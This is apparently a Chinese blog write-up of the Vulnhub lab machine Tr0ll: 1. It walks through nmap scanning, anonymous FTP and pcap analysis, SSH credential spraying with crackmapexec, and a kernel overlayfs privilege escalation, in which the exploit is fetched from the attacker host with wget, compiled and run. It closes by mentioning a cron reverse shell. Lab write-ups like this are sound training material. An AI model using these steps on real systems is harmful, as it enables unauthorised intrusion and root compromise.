---
title: Vulnhub-Tr0ll 1
published: 2025-03-09 16:17:52
tags: [Vulnhub]
category: 靶机
draft: false
---

# Tr0ll: 1

> [https://www.vulnhub.com/entry/tr0ll-1,100/](https://www.vulnhub.com/entry/tr0ll-1,100/)
> 

## 主机发现端口扫描

1. 探测存活主机，`154`为靶机
    
    ```php
    nmap -sP 192.168.75.0/24
    //
    Starting Nmap 7.93 ( https://nmap.org ) at 2024-09-27 08:50 CST
    Nmap scan report for 192.168.75.1
    Host is up (0.00026s latency).
    MAC Address: 00:50:56:C0:00:08 (VMware)
    Nmap scan report for 192.168.75.2
    Host is up (0.00032s latency).
    MAC Address: 00:50:56:FB:CA:45 (VMware)
    Nmap scan report for 192.168.75.154
    Host is up (0.00033s latency).
    MAC Address: 00:0C:29:39:E9:62 (VMware)
    Nmap scan report for 192.168.75.254
    Host is up (0.000079s latency).
    MAC Address: 00:50:56:FB:E7:F4 (VMware)
    Nmap scan report for 192.168.75.151
    Host is up.
    ```
    
2. 扫描主机所有端口
    
    ```php
    nmap -sT -min-rate 10000 -p- 192.168.75.154
    //
    Starting Nmap 7.93 ( https://nmap.org ) at 2024-09-27 08:50 CST
    Nmap scan report for 192.168.75.154
    Host is up (0.0018s latency).
    Not shown: 65532 closed tcp ports (conn-refused)
    PORT   STATE SERVICE
    21/tcp open  ftp
    22/tcp open  ssh
    80/tcp open  http
    MAC Address: 00:0C:29:39:E9:62 (VMware
    ```
    
3. 扫描服务版本及系统版本
    
    ```php
    nmap -sT -sV -O -p21,22,80 192.168.75.154
    //
    Starting Nmap 7.93 ( https://nmap.org ) at 2024-09-27 08:51 CST
    Nmap scan report for 192.168.75.154
    Host is up (0.0026s latency).
    
    PORT   STATE SERVICE VERSION
    21/tcp open  ftp     vsftpd 3.0.2
    22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
    80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
    MAC Address: 00:0C:29:39:E9:62 (VMware)
    Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
    Device type: general purpose
    Running: Linux 3.X|4.X
    OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
    OS details: Linux 3.2 - 4.9
    Network Distance: 1 hop
    Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
    ```
    
4. 扫描漏洞
    
    ```sql
    nmap -script=vuln -p21,22,80 192.168.75.154
    Starting Nmap 7.93 ( https://nmap.org ) at 2024-09-27 08:52 CST
    Nmap scan report for 192.168.75.154
    Host is up (0.00081s latency).
    
    PORT   STATE SERVICE
    21/tcp open  ftp
    22/tcp open  ssh
    80/tcp open  http
    | http-slowloris-check: 
    |   VULNERABLE:
    |   Slowloris DOS attack
    |     State: LIKELY VULNERABLE
    |     IDs:  CVE:CVE-2007-6750
    |       Slowloris tries to keep many connections to the target web server open and hold
    |       them open as long as possible.  It accomplishes this by opening connections to
    |       the target web server and sending a partial request. By doing so, it starves
    |       the http server's resources causing Denial Of Service.
    |       
    |     Disclosure date: 2009-09-17
    |     References:
    |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
    |_      http://ha.ckers.org/slowloris/
    |_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
    | http-enum: 
    |   /robots.txt: Robots file
    |_  /secret/: Potentially interesting folder
    |_http-dombased-xss: Couldn't find any DOM based XSS.
    |_http-csrf: Couldn't find any CSRF vulnerabilities.
    MAC Address: 00:0C:29:39:E9:62 (VMware)
    ```
    

## FTP

1. 使用匿名用户登录
2. 存在一个pcap文件，使用wireshark打开，观察此文件
    
    ![image.png](image%2019.png)
    
    应该是存在一个`secret_stuff.txt`文件
    
3. 找到传输`secret_stuff.txt` 的数据包，能看到明文内容
    
    ![image.png](image%2020.png)
    
    ```sql
    Well, well, well, aren't you just a clever little devil, you almost found the sup3rs3cr3tdirlol
    Sucks, you were so close... gotta TRY HARDER!
    ```
    
    信息：`sup3rs3cr3tdirlol` 可能很重要
    

## web渗透

1. 访问主页
    
    ![image.png](image%2021.png)
    
    翻译过来是：`嘿，非hacker。问题？`
    
2. FTP获取到的信息 `sup3rs3cr3tdirlol` 尝试访问 `/sup3rs3cr3tdirlol` 存在文件`roflmao`，下载下载
    
    使用notepad打开提示：`Find address 0x0856BF to proceed` ，文件头是elf文件，是linux下的可执行文件
    
    使用`010Editor`找不到这个地址，尝试在url操作，访问成功 6
    
3. 来到`/0x0856BF` ，存在几个文本文件
    
    ```sql
    ## /good_luck/which_one_lol.txt
    maleus
    ps-aux
    felux
    Eagle11
    genphlux < -- Definitely not this one
    usmc8892
    blawrg
    wytshadow
    vis1t0r
    overflow
    ```
    
    ```sql
    ##/this_folder_contains_the_password/Pass.txt
    Good_job_:)
    ```
    
    是账号密码，靶机扫描出了`22`端口，所以应该尝试`ssh`登录，但是web上还有一些让人感兴趣的路径没访问（别访问了，给你来一句 `U MAD？`）
    
4. 尝试SSH登录
    
    我一个一个试没事出来，别学我可以使用命令
    
    ```sql
    crackmapexec ssh 192.168.75.154 -u which_one_lol.txt -p Pass.txt --continue-on-success 
    ```
    
    依旧没破解出来，密码真的是`Good_job_:)`吗？有没有可能是`Pass.txt`
    
    `overflow + Pass.txt` 成功登录
    

## 提权

1. 查看权限
    
    ```sql
    $ whoami
    overflow
    //
    $ sudo -
    [sudo] password for overflow: 
    Sorry, user overflow may not run sudo on troll.
    //
    $ ip a
    1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default 
        link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
        inet 127.0.0.1/8 scope host lo
           valid_lft forever preferred_lft forever
        inet6 ::1/128 scope host 
           valid_lft forever preferred_lft forever
    2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 1000
        link/ether 00:0c:29:39:e9:62 brd ff:ff:ff:ff:ff:ff
        inet 192.168.75.154/24 brd 192.168.75.255 scope global eth0
           valid_lft forever preferred_lft forever
        inet6 fe80::20c:29ff:fe39:e962/64 scope link 
           valid_lft forever preferred_lft forever
    //
    $ uname -a
    Linux troll 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:12 UTC 2014 i686 i686 i686 GNU/Linux
    ```
    
2. 不一会root给我踢出来了，感觉有定时任务，但我没找到，因为不给访问
    
    ```sql
    Broadcast Message from root@trol                                               
            (somewhere) at 19:15 ...                                               
                                                                                   
    TIMES UP LOL!                                                                  
                                                                                   
    Connection to 192.168.75.154 closed by remote host.
    Connection to 192.168.75.154 closed.
    ```
    
3. 别的方法尝试了，最后尝试内核漏洞
    
    ```sql
    searchsploit 3.13.0    
    //
    ----------------------------------------------------------------------------------------- ---------------------------------
     Exploit Title                                                                           |  Path
    ----------------------------------------------------------------------------------------- ---------------------------------
    Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privileg | linux/local/37292.c
    Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privileg | linux/local/37293.txt
    Unified Remote 3.13.0 - Remote Code Execution (RCE)                                      | windows/remote/51309.py
    ----------------------------------------------------------------------------------------- ---------------------------------
    Shellcodes: No Results
    ```
    
    将`37292.c`拉取下来，然后打开服务器方便靶机下载
    
    ```sql
    cd /tmp
    wget http://192.168.75.151/37292.c
    gcc 37292.c -o 37292  
    ./37292
    ```
    
    获得root
    
    ```sql
    whoami
    root
    ```
    

## 思路

直接讲提权，登陆一会被root弹出去肯定是存在crontab定时任务的，但是因为我cat /etc/crontab被权限拒绝后就停止这个思路了，查看红队笔记WP，寻找cronlog这种模糊字样最后找到定时任务，最后追加反弹shell代码即可